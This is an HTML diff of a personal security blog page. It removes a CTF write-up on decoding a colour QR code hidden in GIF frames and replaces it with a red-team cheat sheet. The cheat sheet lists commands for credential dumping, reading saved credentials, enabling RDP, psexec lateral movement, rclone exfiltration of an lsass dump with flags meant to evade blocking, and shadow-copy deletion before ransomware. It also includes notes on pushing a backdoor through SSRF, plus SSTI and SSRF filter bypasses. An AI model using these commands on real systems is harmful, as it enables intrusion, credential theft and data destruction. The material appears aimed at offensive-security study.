+python3 secretsdump.py -sam sam.save -system system.save LOCAL
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+PowerShell history and PuTTY sessions:
+
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Credential Manager and running as admin:
+
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Sensitive files to check:
+
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+-----------------------------------------------------
+    </code></pre>
+</div>
+
 
 <!-- 6 -->
-<h2 id="description"><a href="#description">Discovery Phase</a></h2><p>Perchance, Professor Paranoid purposefully painted this puzzling picture to prompt his pupils. Perhaps, you can procure the passphrase.</p>
+<h2 id="description"><a href="#description">Lateral Movement Phase</a></h2>
 
-	<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>Attachments: chal.gif
-</code></pre></code></div>
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Enable RDP in the target machine (need admin):
+
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall show rule name=all dir=in | Select-String -Pattern "3389" -Context 9,9
+netsh advfirewall firewall show rule name=all | find "3389"
+netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Psexec command:
+
+python3 psexec.py WinDev2211Eval/user:password@192.168.18.252 
+// if you give it Admin domain RDP account, you'll directly be getting system mandatory level & you can check events for 7045 last time to enter the password I had to do quotes
+
+wevtutil qe System /q:"*[System[(EventID=7045)]]" /f:text 
+// you will find created service Pblpclun.exe
+
+Mitigations:
+
+Mitigations: https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/ 
+block smb inbound connection to prevent psexec:  
+netsh advfirewall firewall add rule name="Block_SMB_Inbound" dir=in action=block protocol=TCP localport=137,138,139,445
+-----------------------------------------------------
+    </code></pre>
+</div>
+
+
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Impacket tools:
+
+Impacket tools: https://tools.thehacker.recipes/impacket
+-----------------------------------------------------
+    </code></pre>
+</div>
+
 
 <!-- 7 -->
-<h2 id="description"><a href="#description">Lateral Movement Phase</a></h2><p>Perchance, Professor Paranoid purposefully painted this puzzling picture to prompt his pupils. Perhaps, you can procure the passphrase.</p>
+<h2 id="description"><a href="#description">Exfiltration Phase</a></h2>
 
-	<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>Attachments: chal.gif
-</code></pre></code></div>
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Public Data Online:
+
+rclone config  // after configuring your login
+rclone listremotes
+rclone lsf mega:
+
+"C:\Windows\system32\rclone.exe" copy C:\temp\lsass.DMP mega:exfil -P -u --checkers 100 --ignore-existing --checkers 50 --auto-confirm --max-age 5y --multi-thread-cutoff 50M --stats 10s --stats-one-line --transfers 150 --multi-thread-streams 500  
+// the extra flags to bypass the company to block certain number of packets size etc
+-----------------------------------------------------
+    </code></pre>
+</div>
+</p>
+
 
 <!-- 8 -->
-<h2 id="description"><a href="#description">Exfiltration Phase</a></h2><p>Perchance, Professor Paranoid purposefully painted this puzzling picture to prompt his pupils. Perhaps, you can procure the passphrase.</p>
+<h2 id="description"><a href="#description">Impact Phase</a></h2>
 
-	<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>Attachments: chal.gif
-</code></pre></code></div>
+<div class="github-dark">
+    <pre><code>
+-----------------------------------------------------
+Shadow Copy Deletion:
+
+vssadmin delete shadows /all /quiet
+wmic shadowcopy delete 
+// attackers execute this before running ransomware to prevent restoring data from shadow copies
+-----------------------------------------------------
+    </code></pre>
+</div>
+
 
 <!-- Rest  -->
+<h2 id="description"><a href="#description">References</a></h2>
+
+<div class="github-dark"><code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><!----><pre class=""><code>
+=============[CHAT HEADS]======
+Insecure Permissions Security Risk
+Insecure Permissions Security Risk
+AD Computer Naming and Policies
+Extracting C Code from Image
+
+===========[ CYBER NERD ] =========
+https://unprotect.it/
+interesting go by: https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5 
+
+latest mimikatz update: https://github.com/gentilkiwi/mimikatz/releases 
+
+got it from: https://twitter.com/gentilkiwi/status/851193274836692994 
+
+about rdp and bmp https://www.allthingsdfir.com/do-you-even-bitmap-cache-bro/ 
+=============== [ COURSES ] ========
+Mastering Red Team:The Complete Cyber Security Course (2023) by Nikhil Srivastava
+Beginning C++ Programming - From Beginner to Beyond by Dr. Frank Mitropoulos
+Mastering Data Structures & Algorithms using C and C++ by Abdul Bari
+The Complete SSL and TLS Guide: HTTP to HTTPS by Bogdan Stashchuk
+The Complete Networking Fundamentals Course. Your CCNA start by David Bombal
+Cisco BGP Masterclass for Enterprise Network Engineers by Neil Anderson
+SSL/TLS essentials: theory and implementation by Ahmed Elfakharany
+Docker Mastery: with Kubernetes +Swarm from a Docker Captain by Bret Fisher
+Windows Privilege Escalation for Beginners (2020) [En] by Heath Adams
+Pluralsight - Red Team Tools 
+Pluralsight - Blue Team Tools
+x86_64 Assembly Language and Shellcoding on Linux by Pentesters Academy
+Security Manage Network Security With pfSense Firewall by Manuj Aggarwal
+Ethical Hacking/Complete RED TEAM OPERATIONS in Practical by Ajay Ravichandran
 
 
-<h2 id="challenge"><a href="#challenge">Challenge</a></h2>
-
-<p>Using <code data-v-85b4a466="" class="highlighted-code">eog chal.gif</code> I got :</p>
 
 
+=================[NOT SO SECURE ] ==============================
 
-<code data-v-564f77c2="" style="position: relative; display: block;" language="solidity" highlights="" meta=""><button data-v-564f77c2="" class="copy-icon"><svg data-v-564f77c2="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 12.9V17.1C16 20.6 14.6 22 11.1 22H6.9C3.4 22 2 20.6 2 17.1V12.9C2 9.4 3.4 8 6.9 8H11.1C14.6 8 16 9.4 16 12.9Z"></path><path d="M17.0998 2H12.8998C9.81668 2 8.37074 3.09409 8.06951 5.73901C8.00649 6.29235 8.46476 6.75 9.02167 6.75H11.0998C15.2998 6.75 17.2498 8.7 17.2498 12.9V14.9781C17.2498 15.535 17.7074 15.9933 18.2608 15.9303C20.9057 15.629 21.9998 14.1831 21.9998 11.1V6.9C21.9998 3.4 20.5998 2 17.0998 2Z"></path></svg></button><div class="github-dark">
-<pre><code>
-<img src="chal.gif">
-</code></pre>
+-------[Linux Enumeration]-----------
+https://pentestmonkey.net/tools/audit/unix-privesc-check
+https://github.com/rebootuser/LinEnum
+
+-------[privesc]-----------
+
+Linux Kernel 2.6.37 rootkit
+https://www.exploit-db.com/exploits/15704
+</code></pre></code></div>
+
+
+
+<!-- 7 -->
+<h2 id="description"><a href="#description">My Notes</a></h2>
+
+<div class="github-dark">
+    <pre><code>
+---------------------------------------------------
+when ippsec in minnions htb wanted to transfer file to windows he encoded it to avoid special characters interpreted mistakingly using kali powershell using the following commands:
+
+$Shell = Get-Content -Raw ./Invoke-PowerShellIcmp.ps1
+$bytes2 = [System.Text.Encoding]::Unicode.GetBytes($Shell)
+$Encoded = [Convert]::ToBase64String($bytes2)
+
+$Encoded | icmp.ps1.b64
+
+
+fold -w 120 icmp.ps1.b64 > tmp
+mv tmp icmp.ps1.b64
+
+he then url encoded any + or the == at the end manually and created the script that functionalize SSRF to send his data
+
+++++++++++++
+#!/bin/bash
+export IFS=$'\n'
+for line in $(cat icmp.ps1.b64); do
+    ipsec="echo ${line} >> C:/Temp/ipsec-shell.ps1"
+    curl -v -G -X GET "http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx" --data-urlencode "xcmd=$ipsec"
+done
+++++++++++++
+
+echo -e '#!/bin/bash\nexport IFS=$'\''\n'\''\nfor line in $(cat icmp.ps1.b64); do\n    ipsec="echo ${line} >> C:/Temp/ipsec-shell.ps1"\n    curl -v -G -X GET "http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx" --data-urlencode "xcmd=$ipsec"\ndone' > sendfile.sh
+
+
+
+he did all this to nishang/invoke-powershellicmp.ps1 backdoor tunnel 
+he also put the execution command in the victim side at the bottom of the invoke-powershellicmp.ps1 script
+
+he then only run the command in his system as the   invoke-powershellicmp.ps1 guid said 
+
+
+ decoding it using the following commands:
+
+$Decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded2))
+$Decode | Out-File test.ps1
+
+he then relized maximum number of characters for url is 2 thousands and his file is around 22k so he decided to split and transfer it
+---------------------------------------------------
+    </code></pre>
 </div>
-</code>
 
-<p>our goal is to somehow extract <code data-v-85b4a466="" class="highlighted-code">c</code>, <code data-v-85b4a466="" class="highlighted-code">n</code> and <code data-v-85b4a466="" class="highlighted-code">e</code> inside the GIF and break the encryption to finally get the flag.</p><h2 id="solution"><a href="#solution">Solution</a></h2><p>The GIF frames motion looks like a pattern of chronological pieces of encoded and traditional QR code. Since it is in order I strapped the frames using the online tool <a href="https://ezgif.com/split">ezgif.com</a>, I got around 200 frames, I created the following python script that will take the frames directory and put them in the correct order in one image : 
+<div class="github-dark">
+    <pre><code>
+
+---------------------------------------------------
+SSTI - enables you to execute commands and get reverse shell you will have to pop some error to get what marker being used to know what language the marker is using and 
+search for a commands to execute shell you can use ${{<%[%'"}}%\
+---------------------------------------------------
+- XSS - stored xss is like the vuln i found in the css api that injects whatever markup language and your script in the page  
 
 
+---------------------------------------------------
+- Broken Access Control - access or modify data beyond your limit
+path traversal 
 
-<code data-v-564f77c2="" style="position: relative; display: block;" language="bash" highlights="" meta=""><!----><div class="github-dark">
+------------------------------------------------------
+CSRF - i have understood during my kl which is taking advantage of the fact that the user is logged in the website and taking advantage of his session that he opened, so instead of 
+starting from the beganing and stealing his creds to login etc he will use the user to send a request using his open session that is if there is no CSRF token that the the his 
+request needs in order to perform the function
 
-	<button data-v-564f77c2="" class="copy-icon"><svg data-v-564f77c2="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 12.9V17.1C16 20.6 14.6 22 11.1 22H6.9C3.4 22 2 20.6 2 17.1V12.9C2 9.4 3.4 8 6.9 8H11.1C14.6 8 16 9.4 16 12.9Z"></path><path d="M17.0998 2H12.8998C9.81668 2 8.37074 3.09409 8.06951 5.73901C8.00649 6.29235 8.46476 6.75 9.02167 6.75H11.0998C15.2998 6.75 17.2498 8.7 17.2498 12.9V14.9781C17.2498 15.535 17.7074 15.9933 18.2608 15.9303C20.9057 15.629 21.9998 14.1831 21.9998 11.1V6.9C21.9998 3.4 20.5998 2 17.0998 2Z"></path></svg></button>
+------------------------------------------------------
+IDOR
 
-<pre><code>
-<span class="ct-857441">import</span> os
-<span class="ct-857441">from</span> PIL <span class="ct-857441">import</span> Image
+OAUTH - this will log you in to completely different user just by knowing his email for example so in brupsuite you will find interesting request that has your email and replace it 
+by the user you want to log in, or another way take advantage of the CSRF exists in the website to make the user log the attacker's social media to log in so this is CSRF with OAUTH 2.0
 
-qr_code_width, qr_code_height = <span class="ct-806137">127</span> * <span class="ct-806137">10</span>, <span class="ct-806137">127</span> * <span class="ct-806137">20</span>
-full_qr_code = Image.new(<span class="ct-533739">"RGB"</span>, (qr_code_width, qr_code_height))
+------------------------------------------------------------------------------------------------------------
+SSRF - server side request forgery is like when you access box and try finding inner services, so it will enable you to access inner services without the need to have initial access
+however be carefull, when you load localhost services like website it is already asked the admin for the domain and he entered the domain as localhost so it will always check the url
+and when it will load for you the page in the main website page the url will be different domain so you will have to not click instead copy the link you want to navigate and provide 
+it to the SSRF vulnerable parameter. beside that you can also dicover any other services running in another hosts in the local network exactly like if you were inside the victim host 
+where you can use burp sniper to only enumerate all network hosts with port :8080 or cluster bomb to enumerate all the network for multiple port each .
+so it is like ss -tpln or nmap the entire subnet and check for open ports. there could be a blacklist (file contains words that you might use like localhost, /admin etc) before the 
+requested url in the parameter is forwarded, so you can replace localhost with 127.0.0.1, 127.1, lOcaLHost,017700000001, 0x7f000001,2130706433 
 
-bw_frames_folder_path = <span class="ct-533739">'salta'</span>
+however remember that in real life scenarios you will not get informative errors like if there is blacklist you will get 
+"External stock check blocked for security reasions" or for the domain to not be localhost you will not get informative error like "admin interface only available if loggedin as an administrator or if requested from loopback" so we have to figure these errors by intuition or it might be whitelist saying somwthing like "Externakl host must be stock.someweb.com" which in real case scenarios will not say it but whitelist will wxists so you will need to bypass the whitelist with something like http://localhost#@stock.someweb.com and encode # two times to be something like http://localhost%25%32%33stock.weliketoshop.net/ some times we have open redirect where the first we take the first url like/ stockapi=/product/nextproduct?currentproductid=4 then we paste it in the browser with the original domain to get another parameter like ..&path=http://.. which this parameter might be vuln to SSRF
+------------------------------------------------------------------------------------------------------------
 
-<span class="ct-857441">for</span> i <span class="ct-857441">in</span> range(<span class="ct-806137">20</span>):
-    <span class="ct-857441">for</span> j <span class="ct-857441">in</span> range(<span class="ct-806137">10</span>):
-        <span class="ct-857441">if</span> i < <span class="ct-806137">10</span>:
-            frame_number = (j + i * <span class="ct-806137">10</span>) * <span class="ct-806137">2</span>
-        <span class="ct-857441">else</span>:
-            frame_number = (j + (i - <span class="ct-806137">10</span>) * <span class="ct-806137">10</span>) * <span class="ct-806137">2</span> + <span class="ct-806137">1</span>
-        
-        frame_path = os.path.join(bw_frames_folder_path, f<span class="ct-533739">'frame_{frame_number:03d}_delay-0.01s.gif'</span>)
-        
-        <span class="ct-857441">if</span> os.path.exists(frame_path):
-            frame_image = Image.open(frame_path)
-            position = (j * <span class="ct-806137">127</span>, i * <span class="ct-806137">127</span>)
-            full_qr_code.paste(frame_image, position)
 
-full_qr_code_path = <span class="ct-533739">'full_image.png'</span>
-full_qr_code.save(full_qr_code_path)
-</code></pre>
+    </code></pre>
 </div>
 
+<div class="github-dark">
+    <pre><code>
+---------------------------------------------------
+in Boardlight ippsec found exploit.py script to exploit the cms but when he wanted to see what requests goes from him to the cms that the script does instead of editting each line in the script to forward a copy to the burp proxy, he modified the host file so the vhost points
+to 127.0.0.1 and in burpsuite under Tools > proxy he added 127.0.0.1:8081 in the binding and redirected that to the website so he will be the man in the middle in the Requesting handling
+------------------------------------------------------------------------------------------------------------
 
-<!-- ] -->
 
-<p>Run the script and you will get full_image.png  that looks like this :</p>
-
-<center>
-	
-<code data-v-564f77c2="" style="position: relative; display: block;" language="solidity" highlights="" meta=""><button data-v-564f77c2="" class="copy-icon"><svg data-v-564f77c2="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 12.9V17.1C16 20.6 14.6 22 11.1 22H6.9C3.4 22 2 20.6 2 17.1V12.9C2 9.4 3.4 8 6.9 8H11.1C14.6 8 16 9.4 16 12.9Z"></path><path d="M17.0998 2H12.8998C9.81668 2 8.37074 3.09409 8.06951 5.73901C8.00649 6.29235 8.46476 6.75 9.02167 6.75H11.0998C15.2998 6.75 17.2498 8.7 17.2498 12.9V14.9781C17.2498 15.535 17.7074 15.9933 18.2608 15.9303C20.9057 15.629 21.9998 14.1831 21.9998 11.1V6.9C21.9998 3.4 20.5998 2 17.0998 2Z"></path></svg></button><div class="github-dark">
-<pre><code>
-<img src="full_image.png" width="179.108" height="358.217">
-</code></pre>
+    </code></pre>
 </div>
-</code>
-
-</center>
-
-<p>The first traditional QR take us to the lyrics of the song Never Gonna Give You Up. So, It seems that we have to decode the encoded QR to get  Professor Paranoid's passphrase so i crop the full GIF to get only the ecnoded QR using tool like gimp in kali, after that I read about how to decode colored QR codes and found <a href="https://images.app.goo.gl/fxY8WmzxzmrR8zif6"> this one </a> so I write another script to decode the QR :</p>
-
-<code data-v-564f77c2="" style="position: relative; display: block;" language="solidity" highlights="" meta=""><button data-v-564f77c2="" class="copy-icon"><svg data-v-564f77c2="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 12.9V17.1C16 20.6 14.6 22 11.1 22H6.9C3.4 22 2 20.6 2 17.1V12.9C2 9.4 3.4 8 6.9 8H11.1C14.6 8 16 9.4 16 12.9Z"></path><path d="M17.0998 2H12.8998C9.81668 2 8.37074 3.09409 8.06951 5.73901C8.00649 6.29235 8.46476 6.75 9.02167 6.75H11.0998C15.2998 6.75 17.2498 8.7 17.2498 12.9V14.9781C17.2498 15.535 17.7074 15.9933 18.2608 15.9303C20.9057 15.629 21.9998 14.1831 21.9998 11.1V6.9C21.9998 3.4 20.5998 2 17.0998 2Z"></path></svg></button><div class="github-dark">
-<pre><code>
-<span class="ct-857441">import</span> cv2
-<span class="ct-857441">from</span> pyzbar.pyzbar <span class="ct-857441">import</span> decode
-
-<span class="ct-857441">def</span> <span class="ct-806137">separate_channels</span>(image):
-    b_channel, g_channel, r_channel = cv2.split(image)
-    <span class="ct-857441">return</span> r_channel, g_channel, b_channel
-
-<span class="ct-857441">def</span> <span class="ct-806137">decode_qr_from_channel</span>(channel):
-    decoded_objects = decode(channel)
-    <span class="ct-857441">if</span> decoded_objects:
-        <span class="ct-857441">return</span> decoded_objects[<span class="ct-806137">0</span>].data.decode(<span class="ct-533739">'utf-8'</span>)
-    <span class="ct-857441">return</span> None
-
-<span class="ct-857441">def</span> <span class="ct-806137">decode_color_qr</span>(image_path):
-    image = cv2.imread(image_path)
-    <span class="ct-857441">if</span> image <span class="ct-857441">is</span> None:
-        <span class="ct-857441">raise</span> ValueError(f<span class="ct-533739">"Image not found or file not readable: {image_path}"</span>)
-    
-    red_channel, green_channel, blue_channel = separate_channels(image)
-    
-    red_data = decode_qr_from_channel(red_channel)
-    green_data = decode_qr_from_channel(green_channel)
-    blue_data = decode_qr_from_channel(blue_channel)
-    
-    final_data = {
-        <span class="ct-533739">'red'</span>: red_data,
-        <span class="ct-533739">'green'</span>: green_data,
-        <span class="ct-533739">'blue'</span>: blue_data
-    }
-    <span class="ct-857441">return</span> final_data
-
-image_path = <span class="ct-533739">'full_image.png'</span>
-decoded_data = decode_color_qr(image_path)
-<span class="ct-857441">print</span>(decoded_data)
-</code></pre>
-</div>
-</code>
-
-<p>Amazing ! Look at what has appeared :</p>
-
-<code data-v-564f77c2="" style="position: relative; display: block;" highlights=""><button data-v-564f77c2="" class="copy-icon"><svg data-v-564f77c2="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 12.9V17.1C16 20.6 14.6 22 11.1 22H6.9C3.4 22 2 20.6 2 17.1V12.9C2 9.4 3.4 8 6.9 8H11.1C14.6 8 16 9.4 16 12.9Z"></path><path d="M17.0998 2H12.8998C9.81668 2 8.37074 3.09409 8.06951 5.73901C8.00649 6.29235 8.46476 6.75 9.02167 6.75H11.0998C15.2998 6.75 17.2498 8.7 17.2498 12.9V14.9781C17.2498 15.535 17.7074 15.9933 18.2608 15.9303C20.9057 15.629 21.9998 14.1831 21.9998 11.1V6.9C21.9998 3.4 20.5998 2 17.0998 2Z"></path></svg></button><pre class=""><code>
-
-	{'red': 'e = 580107295407929983455474259123048958892268616065202610504097478704300124688755104518843786843320420594328180667097651308831224484345522788974595814072054519017036375295283346355248179858634315967974862898808223500971903823682739564989144161533670334282168903963815530341737627355737754279837367500836251818257011349990096996208188583942365085839848233828296376979143808880317533866787720420277343358834561294167770535918326741342201019483634741886264335838390481475273985184921917334302415384882333709406390155772477875038574493991862714614995400554302836808307148531462169082270581410355365459689979718410594946465757345418167500441759086471705367181923686763503684027485517203432506707344347783693800292516556903295589747181683464968271679813556995850747615373120820875968987307345135528514167832232730587801941826874478866266248104183762332450746296192019414713597801306568432969966780462547060873090168456225293338399628593451782650498742449891396155749182822135489206945557245425857310335962454516172608455034226164240182895467945937699668831887344790952929260964764874686656180773292544947330844662364326840643409486240155063338637903846556007310024878543296033058049856666554133648498640712529858440916870291185920494704803143', 'green': 'n = 676791844642584980698053302310223785374313385409403045588113725155016812136880955271984417983873824026716210778280593193636428565069776587137028449750730272186542437844497237414456209835073368629304006715276260751133887794296529492487334855122615389995863721291118118732027231915027379993143595417642293787966513241655113162242886681266092600146489606133012439809001110360370456177919007156990233918640321509862398958571381198232567856064240532200641725144788895054486316049075570223352817949029389327640788515067890854211670242990506500384161300646686642943025006620039197262649011645414593036304976338145694104210102443351633126298836188101611468727285524121350542326419652662876739876424845347479917953656717595927494531015461852178181228442298434483771040709741405863344788052581819778178386583342583162229291454214612057110480344851213811069677642675472810388144418347604660534845766311357971367827288922569847511151214222283088837375795803519692209817560935544948763568461379169948048755718648569869223176458921320498263580169173526435342144022663119655800743047260437276330638259847190731172746917271144508137645140847075476659515891899224768333964574305422773267597098695989323996565887847836862251898531683849611661559455231', 'blue': 'c = 544342977532404237408772156018844280042896018581454027178213021966933179442845437798554673545620437077690160719361782366496084247799878518975715150796511397840519300211970113174385006721394626735058682356052519383771627256690815712967712491626102749570315765793607724436304925195447530638210491706318962714162678496224311664384796373433133484652485030434903014477989234639514499007880766266336487828650563294477369869284464009446027489791555956252580321314582911124874488376100440106092810747363952104507525352045668294528122872841750097177464905666071617876996930044144939116978812626955932102034257961709955290700427646253669485222926458797085660621146417897771007300680609504190057013973071878997514930801531407454022185046675516302040705165530852907708234116394362314177321060017882453944778571652891878787594756953941882037855500075620246192415211529447574738034705454952785438018144229155984327393211236378437222298093295385097467084627926991924915499333729453319553497885055095056469836597798913831551134953389760004832277777103218600963483821015591765052538315472933051886240356519093653467540608074668757871161552736235872811563026735761624551483971176815836236188425184614789972749058974348218017069740385931961400851689995'}
-
-</code></pre></code>
-
-<p>You can also extract the encoded QR and submit it to the online stego tool <a href="https://www.aperisolve.com/">aperisolve</a> to get the same result. The only thing now is to decrypt c using n and e, I managed to decrypt using the online tool <a href="https://www.dcode.fr/rsa-cipher">dcode.fr</a>  and got the flag : <code data-v-85b4a466="" class="highlighted-code">nite{71m3_70_fr4m3_7h15_c0l0urful_e_n_c_0d3d_qr}</code> </p>
-
-<p>ADDITION: this is a script that does the  above full process only give it the chal.gif and it will return the content directly Ahoyy, Mateyy ! :</p>
-
-
-<code data-v-564f77c2="" style="position: relative; display: block;" language="solidity" highlights="" meta=""><button data-v-564f77c2="" class="copy-icon"><svg data-v-564f77c2="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 12.9V17.1C16 20.6 14.6 22 11.1 22H6.9C3.4 22 2 20.6 2 17.1V12.9C2 9.4 3.4 8 6.9 8H11.1C14.6 8 16 9.4 16 12.9Z"></path><path d="M17.0998 2H12.8998C9.81668 2 8.37074 3.09409 8.06951 5.73901C8.00649 6.29235 8.46476 6.75 9.02167 6.75H11.0998C15.2998 6.75 17.2498 8.7 17.2498 12.9V14.9781C17.2498 15.535 17.7074 15.9933 18.2608 15.9303C20.9057 15.629 21.9998 14.1831 21.9998 11.1V6.9C21.9998 3.4 20.5998 2 17.0998 2Z"></path></svg></button><div class="github-dark">
-<pre><code>
-<span class="ct-857441">from</span> PIL <span class="ct-857441">import</span> Image
-<span class="ct-857441">import</span> os
-<span class="ct-857441">import</span> cv2
-<span class="ct-857441">from</span> pyzbar.pyzbar <span class="ct-857441">import</span> decode
-
-<span class="ct-857441">def</span> <span class="ct-806137">split_gif_frames</span>(gif_path, frames_dir):
-    gif = Image.open(gif_path)
-    os.makedirs(frames_dir, exist_ok=<span class="ct-806137">True</span>)
-    frame_number = <span class="ct-806137">0</span>
-    <span class="ct-857441">while</span> <span class="ct-806137">True</span>:
-        frame_path = f<span class="ct-533739">"{frames_dir}/frame_{frame_number}.png"</span>
-        gif.save(frame_path)
-        frame_number += <span class="ct-806137">1</span>
-        <span class="ct-857441">try</span>:
-            gif.seek(gif.tell() + <span class="ct-806137">1</span>)
-        <span class="ct-857441">except</span> EOFError:
-            <span class="ct-857441">break</span>
-
-<span class="ct-857441">def</span> <span class="ct-806137">reassemble_qr</span>(frames_dir, qr_code_path):
-    qr_code_width, qr_code_height = <span class="ct-806137">127</span> * <span class="ct-806137">10</span>, <span class="ct-806137">127</span> * <span class="ct-806137">20</span>
-    full_qr_code = Image.new(<span class="ct-533739">"RGB"</span>, (qr_code_width, qr_code_height))
-    <span class="ct-857441">for</span> i <span class="ct-857441">in</span> range(<span class="ct-806137">20</span>):
-        <span class="ct-857441">for</span> j <span class="ct-857441">in</span> range(<span class="ct-806137">10</span>):
-            frame_number = (j + i * <span class="ct-806137">10</span>) * <span class="ct-806137">2</span> <span class="ct-857441">if</span> i < <span class="ct-806137">10</span> <span class="ct-857441">else</span> (j + (i - <span class="ct-806137">10</span>) * <span class="ct-806137">10</span>) * <span class="ct-806137">2</span> + <span class="ct-806137">1</span>
-            frame_path = os.path.join(frames_dir, f<span class="ct-533739">'frame_{frame_number}.png'</span>)
-            <span class="ct-857441">if</span> os.path.exists(frame_path):
-                frame_image = Image.open(frame_path)
-                full_qr_code.paste(frame_image, (j * <span class="ct-806137">127</span>, i * <span class="ct-806137">127</span>))
-    full_qr_code.save(qr_code_path)
-
-<span class="ct-857441">def</span> <span class="ct-806137">decode_color_qr</span>(image_path):
-    image = cv2.imread(image_path)
-    <span class="ct-857441">if</span> image <span class="ct-857441">is</span> None:
-        <span class="ct-857441">raise</span> ValueError(f<span class="ct-533739">"Image not found or file not readable: {image_path}"</span>)
-    red_channel, green_channel, blue_channel = cv2.split(image)
-    final_data = {}
-    <span class="ct-857441">for</span> color, channel <span class="ct-857441">in</span> zip((<span class="ct-533739">'red'</span>, <span class="ct-533739">'green'</span>, <span class="ct-533739">'blue'</span>), (red_channel, green_channel, blue_channel)):
-        decoded_objects = decode(cv2.merge([channel, channel, channel]))
-        final_data[color] = decoded_objects[<span class="ct-806137">0</span>].data.decode(<span class="ct-533739">'utf-8'</span>) <span class="ct-857441">if</span> decoded_objects <span class="ct-857441">else</span> None
-    <span class="ct-857441">return</span> final_data
-
-<span class="ct-857441">if</span> <span class="ct-533739">__name__</span> == <span class="ct-533739">"__main__"</span>:
-    gif_path = <span class="ct-533739">'chal.gif'</span>
-    frames_dir = <span class="ct-533739">'salta'</span>
-    full_qr_code_path = <span class="ct-533739">'full_image.png'</span>
-    
-    <span class="ct-244866"># Step 1: Split GIF into frames</span>
-    split_gif_frames(gif_path, frames_dir)
-    
-    <span class="ct-244866"># Step 2: Reassemble the QR code</span>
-    reassemble_qr(frames_dir, full_qr_code_path)
-    
-    <span class="ct-244866"># Step 3: Decode the color QR code</span>
-    decoded_data = decode_color_qr(full_qr_code_path)
-    <span class="ct-857441">print</span>(decoded_data)
-</code></pre>
-</div>
-</code>
-
 
 <style>.github-dark{color:#e1e4e8;background:#24292e;}.ct-806137{color:#B392F0;}.ct-767297{color:#E1E4E8;}.ct-244866{color:#9ECBFF;}.ct-533739{color:#79B8FF;}.ct-326375{color:#6A737D;}.ct-857441{color:#F97583;}.ct-211346{color:#85E89D;}.ct-657843{color:#FFAB70;}</style></div></article></div><div class="bug-container" data-v-3d677fb4=""><svg id="bug-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="-500 -500 1000 1000" shape-rendering="geometricPrecision" text-rendering="geometricPrecision"><g id="centeredGroup"><g><g id="bug" transform="scale(0.3)" class="no-anim"><g transform="matrix(0 1 1 0 -181 -190)"><g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path><g transform="matrix(-1 0 0 1 508.385 0)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><path d="M254.526,97.911c-35.103,18.394-69.049,34.232-69.049,86.61h138.098c0-52.378-33.945-68.216-69.049-86.61Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-1 0 0 1 435.535-38.4886)" clip-rule="evenodd"><path 